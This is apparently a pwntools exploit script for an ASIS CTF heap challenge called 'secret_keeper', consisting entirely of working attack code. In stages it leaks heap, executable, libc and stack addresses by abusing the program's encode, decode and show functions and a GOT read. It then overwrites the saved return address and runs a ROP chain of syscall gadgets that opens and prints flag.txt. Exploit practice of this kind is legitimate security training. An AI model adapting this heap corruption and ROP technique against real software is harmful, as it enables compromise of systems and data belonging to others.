#!/usr/bin/python3

from pwn import *

def create(name=b'', size=0, secret=b'', encoder=0, useprev=0, number=0):
	p.sendlineafter(b'>> ', b'1')
	if useprev!=9999:
		p.sendlineafter(b'secret?(0/1)', str(useprev).encode(), timeout=1)
		if useprev:
			p.sendlineafter(b'>> ', str(number).encode())
		else:
			p.sendlineafter(b'Name: ', name)
			p.sendlineafter(b'Secret size:', f'{size}'.encode())
			p.sendline(secret)
			p.sendlineafter(b'3. None', f'{encoder}'.encode())
	else:
		p.sendlineafter(b'Name: ', name)
		p.sendlineafter(b'Secret size:', f'{size}'.encode())
		p.sendline(secret)
		p.sendlineafter(b'3. None', f'{encoder}'.encode())

def edit(number, name, size, secret, encoder):
	p.sendlineafter(b'>> ', b'2')
	p.sendlineafter(b'>> ', str(number).encode())
	p.sendlineafter(b'Name:', name)
	p.sendlineafter(b'Secret size: ', f'{size}'.encode())
	p.sendline(secret)
	p.sendlineafter(b'3. None', f'{encoder}'.encode())

def show(number, hdump=True):
	p.sendlineafter(b'>> ', b'3')
	p.sendlineafter(b'>> ', str(number).encode())
	if hdump:
		return hexdump()

def delete(number):
	p.sendlineafter(b'>> ', b'4')
	p.sendlineafter(b'>> ', str(number).encode())

def enc(number, hdump=True):
	p.sendlineafter(b'>> ', b'5')
	p.sendlineafter(b'>> ', str(number).encode())
	if hdump:
		return hexdump()

def dec(number, hdump=True):
	p.sendlineafter(b'>> ', b'6')
	p.sendlineafter(b'>> ', str(number).encode())
	if hdump:
		return hexdump()

def hexdump():
	from binascii import unhexlify
	
	data = b''
	done = 0
	p.recvuntil(b'secret:\n')
	while not done:
		c = 1
		for i in range(0x10):
			if c%8==0:
				output = p.recvuntil(b'  ', drop=True)
			else:
				output = p.recvuntil(b' ', drop=True)
			# print(output)
			if not output:
				done = 1
			try:
				data += unhexlify(output)
			except binascii.Error:
				return data
			c+=1
		p.recvline()
	return data

def xor(a, key):
	a = list(a)
	key = list(key)
	result = b''
	for i in range(len(a)):
		result += p8(a[i%len(a)] ^ key[i%len(key)])
	return result

libc = ELF('./libc6_2.27-3ubuntu1_amd64.so', checksec=False)
context.binary = exe = ELF('./secret_keeper_patched', checksec=False)
context.log_level = 'debug'

KEY = b'ASIS_CTF_THIS_IS_KEY'

p = process(exe.path)
# p = remote('127.0.0.1', 9999)

##################################
### Stage 1: Leak heap address ###
##################################
create(b'A'*8, 0x48, b'A'*0x47, 1, useprev=9999)
dec(1)
dec(1)
heap_leak = u64(xor(dec(1), KEY)[:8])
log.info("Heap leak: " + hex(heap_leak))
heap_base = heap_leak - 0x3140
log.info("Heap base: " + hex(heap_base))

#################################
### Stage 2: Leak exe address ###
#################################
create(b'B'*8, 0x428, b'B'*0x427, 1, useprev=0)
exe_leak = u64(show(1)[0x30:0x38])
log.info("Exe leak: " + hex(exe_leak))
exe.address = exe_leak - exe.sym['secret_retain']
log.info("Exe base: " + hex(exe.address))

##################################
### Stage 3: Leak libc address ###
##################################
delete(2)
payload = flat(
	exe.got['printf'], 0x100,
	1
	)
create(b'C'*8, 0x48, payload, 1, useprev=0)
printf_addr = u64(show(2)[:8])
log.info("Printf address: " + hex(printf_addr))
libc.address = printf_addr - libc.sym['printf']
log.info("Libc base: " + hex(libc.address))

###################################
### Stage 4: Leak stack address ###
###################################
payload = flat(
	libc.sym['environ']
	)
edit(1, b'D'*8, 0x48, payload, 1)
leak_stack = u64(show(2)[:8])
log.info("Stack leak: " + hex(leak_stack))
saved_rip = leak_stack - 0x1d0
log.info("Saved rip of create_secret(): " + hex(saved_rip))

##########################
### Stage 5: Get shell ###
##########################
create(b'E'*8, 0x408, b'E'*8, 1, useprev=0)
dec(3)
dec(3)
dec(3)
dec(3)
dec(3)
dec(3)
dec(3)
create(b'F'*8, 0x408, flat(saved_rip), 1, useprev=0)

pop_rax = libc.address + 0x00000000000439c8
pop_rdi = libc.address + 0x000000000002155f
pop_rsi = libc.address + 0x0000000000023e6a
pop_rdx = libc.address + 0x0000000000001b96
syscall = libc.address + 0x00000000000d2975
payload = flat(
	# Open flag.txt
	pop_rax, 2,
	pop_rdi, leak_stack - 0x138,
	pop_rsi, 0,
	pop_rdx, 0,
	syscall,

	# pop_rax, 0,
	pop_rdi, 3,
	pop_rsi, leak_stack - 0x1000,
	pop_rdx, 0x100,
	libc.sym['read'],

	pop_rdi, 1,
	libc.sym['write'],
	b'flag.txt', 0
	)
create(b'G'*8, 0x408, b'G', 1, useprev=0)
create(b'F'*8, 0x408, payload, 1, useprev=0)

p.interactive()
